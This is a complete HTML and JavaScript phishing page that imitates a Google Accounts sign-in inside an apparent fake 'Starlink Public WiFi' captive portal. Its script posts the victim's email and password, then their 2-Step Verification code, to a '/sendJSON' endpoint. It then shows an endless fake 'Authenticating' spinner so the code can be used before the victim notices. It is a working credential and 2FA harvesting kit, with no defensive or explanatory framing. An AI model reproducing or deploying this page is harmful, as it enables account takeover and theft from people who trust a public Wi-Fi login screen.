<!doctype html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta
      http-equiv="Cache-Control"
      content="no-cache, no-store, must-revalidate"
    />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <title>Sign in - Google Accounts</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: "Google Sans", "Roboto", Arial, sans-serif;
        background: #fff;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
      }
      .container {
        max-width: 450px;
        width: 100%;
        border: 1px solid #dadce0;
        border-radius: 8px;
        padding: 48px 40px;
      }
      .logo {
        text-align: center;
        margin-bottom: 24px;
      }
      .logo-img {
        width: 89px;
        height: 30px;
      }
      h1 {
        font-size: 24px;
        font-weight: 400;
        color: #202124;
        text-align: center;
        margin-bottom: 8px;
      }
      .subtitle {
        font-size: 16px;
        color: #5f6368;
        text-align: center;
        margin-bottom: 32px;
      }
      .banner {
        background: #e8f5e9;
        border: 1px solid #4caf50;
        border-radius: 8px;
        padding: 16px;
        margin-bottom: 24px;
        text-align: center;
      }
      .banner-title {
        color: #2e7d32;
        font-size: 14px;
        font-weight: 500;
        margin-bottom: 8px;
      }
      .banner-text {
        color: #5f6368;
        font-size: 13px;
      }
      .input-group {
        margin-bottom: 24px;
      }
      .input-group input {
        width: 100%;
        padding: 13px 15px;
        background: #fff;
        border: 1px solid #dadce0;
        border-radius: 4px;
        color: #202124;
        font-size: 16px;
        transition: all 0.2s;
      }
      .input-group input:focus {
        outline: 0;
        border-color: #1a73e8;
        border-width: 2px;
        padding: 12px 14px;
      }
      .input-group input::placeholder {
        color: #80868b;
      }
      .btn {
        width: 100%;
        padding: 12px;
        background: #1a73e8;
        border: 0;
        border-radius: 4px;
        color: #fff;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        margin-top: 24px;
        transition: all 0.2s;
      }
      .btn:hover {
        background: #1765cc;
        box-shadow:
          0 1px 2px 0 rgba(60, 64, 67, 0.3),
          0 1px 3px 1px rgba(60, 64, 67, 0.15);
      }
      .btn:disabled {
        background: #f1f3f4;
        color: #dadce0;
        cursor: not-allowed;
      }
      .footer {
        margin-top: 24px;
        text-align: center;
      }
      .footer a {
        color: #1a73e8;
        text-decoration: none;
        font-size: 14px;
        margin: 0 8px;
      }
      .info {
        font-size: 12px;
        color: #5f6368;
        margin-top: 24px;
        text-align: center;
        line-height: 1.5;
      }
      .hide {
        display: none;
      }
      .code-input {
        display: flex;
        gap: 8px;
        justify-content: center;
        margin: 24px 0;
      }
      .code-input input {
        width: 48px;
        height: 52px;
        text-align: center;
        font-size: 20px;
        font-weight: 500;
        border: 1px solid #dadce0;
        border-radius: 4px;
        color: #202124;
      }
      .code-input input:focus {
        border-color: #1a73e8;
        border-width: 2px;
        outline: 0;
      }
      .resend {
        margin-top: 16px;
        text-align: center;
      }
      .resend a {
        color: #1a73e8;
        text-decoration: none;
        font-size: 14px;
      }
      .loading {
        text-align: center;
        padding: 20px 0;
      }
      .spinner {
        width: 48px;
        height: 48px;
        border: 4px solid #f1f3f4;
        border-top: 4px solid #1a73e8;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 24px;
      }
      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
      .status-text {
        font-size: 14px;
        color: #5f6368;
        margin-top: 16px;
        line-height: 1.6;
      }
      body.starlink-mode {
        background: linear-gradient(180deg, #0a0a0a, #1a1a1a);
        color: #fff;
      }
      body.starlink-mode .container {
        background: transparent;
        border: none;
      }
      body.starlink-mode h1,
      body.starlink-mode .subtitle,
      body.starlink-mode .status-text {
        color: #fff;
      }
      body.starlink-mode .spinner {
        border-color: rgba(255, 255, 255, 0.2);
        border-top-color: #d4a574;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <!-- Google Logo -->
      <div class="logo">
        <svg
          class="logo-img"
          viewBox="0 0 272 92"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            fill="#EA4335"
            d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"
          />
          <path
            fill="#FBBC05"
            d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"
          />
          <path
            fill="#4285F4"
            d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"
          />
          <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z" />
          <path
            fill="#EA4335"
            d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"
          />
          <path
            fill="#4285F4"
            d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"
          />
        </svg>
      </div>

      <div id="stage1">
        <div class="banner">
          <div class="banner-title">✓ WiFi Connected</div>
          <div class="banner-text">Sign in to access the internet</div>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Wi-Fi Network</p>
        <form id="loginForm">
          <div class="input-group">
            <input
              type="email"
              id="email"
              placeholder="Email or phone"
              required
              autocomplete="username"
            />
          </div>
          <div class="input-group">
            <input
              type="password"
              id="password"
              placeholder="Enter your password"
              required
              autocomplete="current-password"
            />
          </div>
          <button type="submit" class="btn">Next</button>
        </form>
        <div class="footer">
          <a href="javascript:void(0)">Forgot email?</a>
          <a href="javascript:void(0)">Create account</a>
        </div>
        <p class="info">
          To continue, Google will share your name, email address, and profile
          picture with this network.
        </p>
      </div>

      <div id="stage2" class="hide">
        <h1>2-Step Verification</h1>
        <p class="subtitle">
          To help keep your account safe, Google wants to make sure it's really
          you trying to sign in
        </p>
        <p class="info" style="margin: 16px 0">
          Enter the 6-digit code sent to your phone
          <strong>(+61) 4** *** ***</strong>
        </p>
        <form id="twoFAForm">
          <div class="code-input">
            <input
              type="tel"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              id="c1"
              required
            />
            <input
              type="tel"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              id="c2"
              required
            />
            <input
              type="tel"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              id="c3"
              required
            />
            <input
              type="tel"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              id="c4"
              required
            />
            <input
              type="tel"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              id="c5"
              required
            />
            <input
              type="tel"
              inputmode="numeric"
              pattern="[0-9]*"
              maxlength="1"
              id="c6"
              required
            />
          </div>
          <button type="submit" class="btn">Verify</button>
        </form>
        <div class="resend">
          <a href="javascript:void(0)" onclick="resend()">Resend code</a>
        </div>
        <p class="info" style="margin-top: 24px">
          If you don't receive the code, make sure your phone is connected and
          can receive SMS messages.
        </p>
      </div>

      <div id="stage3" class="hide">
        <div class="loading">
          <div class="spinner"></div>
          <h1>Authenticating...</h1>
          <p class="subtitle">
            Please wait while Starlink is authenticating you and allowing access
            to the free Starlink Public WiFi
          </p>
          <p class="status-text">
            • Verifying your credentials<br />• Connecting to satellite
            network<br />• Establishing secure connection<br />• Optimizing
            network settings
          </p>
          <p class="info" style="margin-top: 32px">
            This may take a few moments. Please do not close this window.
          </p>
        </div>
      </div>
    </div>

    <script>
      document.getElementById("loginForm").onsubmit = function (e) {
        e.preventDefault();
        var email = document.getElementById("email").value;
        var password = document.getElementById("password").value;
        fetch("/sendJSON", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            stage: "credentials",
            email: email,
            password: password,
            savetostorage: true,
            timestamp: new Date().toISOString(),
          }),
        });
        document.getElementById("stage1").className = "hide";
        document.getElementById("stage2").className = "";
        document.getElementById("c1").focus();
      };

      var inputs = document.querySelectorAll(".code-input input");
      inputs.forEach(function (input, index) {
        input.oninput = function () {
          // Only allow numbers
          this.value = this.value.replace(/[^0-9]/g, "");
          if (this.value.length === 1 && index < 5) {
            inputs[index + 1].focus();
          }
        };
        input.onkeydown = function (e) {
          if (e.key === "Backspace" && this.value === "" && index > 0) {
            inputs[index - 1].focus();
          }
        };
        // Prevent non-numeric input
        input.onkeypress = function (e) {
          if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
          }
        };
      });

      document.getElementById("twoFAForm").onsubmit = function (e) {
        e.preventDefault();
        var code =
          document.getElementById("c1").value +
          document.getElementById("c2").value +
          document.getElementById("c3").value +
          document.getElementById("c4").value +
          document.getElementById("c5").value +
          document.getElementById("c6").value;
        fetch("/sendJSON", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            stage: "2fa_code",
            code: code,
            savetostorage: true,
            timestamp: new Date().toISOString(),
          }),
        });
        document.getElementById("stage2").className = "hide";
        document.getElementById("stage3").className = "";
        document.body.className = "starlink-mode";
        animateStatus();
      };

      function resend() {
        alert("Code resent to (+61) 4** *** ***");
      }

      function animateStatus() {
        var messages = [
          "• Verifying your credentials",
          "• Connecting to satellite network",
          "• Establishing secure connection",
          "• Optimizing network settings",
          "• Checking signal strength",
          "• Allocating bandwidth",
          "• Finalizing configuration",
          "• Almost ready...",
        ];
        var index = 0;
        setInterval(function () {
          var statusEl = document.querySelector(".status-text");
          if (statusEl) {
            index = (index + 1) % messages.length;
            var displayed = [];
            for (var i = 0; i < 4; i++) {
              displayed.push(messages[(index + i) % messages.length]);
            }
            statusEl.innerHTML = displayed.join("<br>");
          }
        }, 3000);
      }
    </script>
  </body>
</html>
